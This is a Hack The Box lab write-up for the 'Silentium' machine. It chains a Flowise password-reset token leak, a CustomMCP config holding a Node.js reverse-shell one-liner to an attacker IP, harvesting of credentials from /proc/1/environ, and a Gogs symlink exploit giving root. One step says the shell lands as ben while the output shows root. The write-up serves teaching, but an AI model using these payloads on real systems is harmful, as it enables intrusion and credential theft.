# HTB Writeup — Silentium

- **IP:** `10.129.27.172`
- **Domain:** `silentium.htb`
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Subdomain Discovery & Flowise](#2-subdomain-discovery--flowise)
3. [Unauthenticated Password Reset (CVE-2025-58434)](#3-unauthenticated-password-reset-cve-2025-58434)
4. [Remote Code Execution via CustomMCP (CVE-2025-59528)](#4-remote-code-execution-via-custommcp-cve-2025-59528)
5. [Lateral Movement to Host](#5-lateral-movement-to-host)
6. [Privilege Escalation via Gogs (CVE-2025-8110)](#6-privilege-escalation-via-gogs-cve-2025-8110)
7. [Flags](#7-flags)

---

## 1. Enumeration

### Adding the Host

```bash
echo "10.129.27.172 silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 10.129.27.172
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | nginx — redirects to silentium.htb |

Browsing to `http://silentium.htb` shows a static landing page with references to a staging environment, hinting at a subdomain.

---

## 2. Subdomain Discovery & Flowise

Subdomain fuzzing or manual inspection confirms the existence of `staging.silentium.htb`.

```bash
echo "10.129.27.172 staging.silentium.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://staging.silentium.htb` reveals a **Flowise AI** instance — a low-code LLM workflow orchestration tool. The landing page and email references expose a valid user: `ben@silentium.htb`.

---

## 3. Unauthenticated Password Reset (CVE-2025-58434)

Flowise versions prior to 3.0.6 leak a password reset token directly in the API response when requesting a forgotten password reset.

### Step 1 — Request a Password Reset

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
```

**Response:**
```json
{"tempToken": "<EXTRACTED_TOKEN>"}
```

### Step 2 — Reset the Password

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<EXTRACTED_TOKEN>",
      "password": "Password123!"
    }
  }'
```

Login is now possible at `http://staging.silentium.htb/login` with `ben@silentium.htb` / `Password123!`.

---

## 4. Remote Code Execution via CustomMCP (CVE-2025-59528)

Flowise allows users to create Chatflows containing a **CustomMCP** node, which spawns an MCP server process using a user-controlled JSON config. The platform fails to sanitise this config, allowing arbitrary command execution via Node.js.

### Step 1 — Start a Listener

```bash
nc -lvnp 4444
```

### Step 2 — Build the Malicious Chatflow

In the Flowise UI:

1. Create a new **Chatflow**
2. Add the following nodes and connect them:
   - **Chat Input** → **Tool Agent** → **Chat Output**
   - **ChatOllama** → Tool Agent (Chat Model input)
   - **CustomMCP** → Tool Agent (Tools input)
3. Set the CustomMCP node config to:

```json
{
  "command": "node",
  "args": [
    "-e",
    "const net=require('net');const cp=require('child_process');const s=net.connect(4444,'<YOUR_IP>',()=>{const sh=cp.spawn('/bin/sh',['-i'],{env:{PATH:'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',TERM:'xterm'}});sh.stdout.pipe(s);sh.stderr.pipe(s);s.pipe(sh.stdin);s.on('close',()=>{});});setInterval(()=>{},9999999);"
  ]
}
```

4. Save the Chatflow and note the `chatflowid` from the embed script.

### Step 3 — Trigger the Exploit

```bash
curl -X POST http://staging.silentium.htb/api/v1/prediction/<CHATFLOW_ID> \
  -H "Content-Type: application/json" \
  -d '{"question": "hello"}'
```

A reverse shell arrives as the `ben` user inside a Docker container.

```
/ # id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. Lateral Movement to Host

The initial shell lands inside a Docker container. Environment variables expose SSH credentials for the host.

### Extract Credentials from Container Environment

```bash
cat /proc/1/environ | tr '\0' '\n'
```

Among the variables:

```
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_USERNAME=ben
```

### SSH to Host

```bash
ssh ben@10.129.27.172
# Password: r04D!!_R4ge
```

Shell obtained as `ben` on the host.

---

## 6. Privilege Escalation via Gogs (CVE-2025-8110)

### Local Service Discovery

```bash
netstat -tulpn | grep 127.0.0.1
```

Port `3001` is listening locally — identified as **Gogs v0.13.0**, a self-hosted Git service running as `root`.

```bash
ps aux | grep gogs
# root  1529  /opt/gogs/gogs/gogs web
```

### Step 1 — Port Forward

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.27.172
```

### Step 2 — Register a Gogs Account

Navigate to `http://localhost:3001/user/sign_up` and register an account.

### Step 3 — Generate an API Token

```bash
curl -X POST -u <user>:<pass> http://localhost:3001/api/v1/users/<user>/tokens \
  -H "Content-Type: application/json" \
  -d '{"name":"pwn"}'
```

### Step 4 — Run the CVE-2025-8110 Exploit

The exploit abuses a symlink race condition. It creates a repository containing a symlink pointing to the Gogs server-side `.git/config` file. It then overwrites that config via the Gogs contents API, injecting a malicious `sshCommand` entry that executes when Gogs processes the repository.

Install dependencies:

```bash
pip install requests beautifulsoup4 rich --break-system-packages
git config --global user.email "you@example.com"
git config --global user.name "youruser"
```

Start a listener:

```bash
nc -lvnp 5555
```

Run the exploit:

```bash
python3 exploit.py -u http://localhost:3001 -lh <YOUR_IP> -lp 5555
```

A root shell arrives on the listener.

```
root@silentium:/opt/gogs/gogs# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 7. Flags

### User Flag

```bash
cat /home/ben/user.txt
```

### Root Flag

```bash
cat /root/root.txt
```

---

## Attack Chain Summary

```
nmap → ports 22, 80
        ↓
subdomain enumeration → staging.silentium.htb → Flowise AI
        ↓
CVE-2025-58434 — unauthenticated password reset token leak
→ account takeover as ben@silentium.htb
        ↓
CVE-2025-59528 — CustomMCP node arbitrary command execution
→ reverse shell inside Docker container (root)
        ↓
/proc/1/environ → SMTP_PASSWORD=r04D!!_R4ge
→ ssh ben@10.129.27.172
        ↓
netstat → port 3001 → Gogs v0.13.0 running as root
→ SSH port forward → register account → generate API token
        ↓
CVE-2025-8110 — symlink race condition → malicious git config injection
→ root shell on host
        ↓
cat /home/ben/user.txt → User Flag
cat /root/root.txt    → Root Flag
```
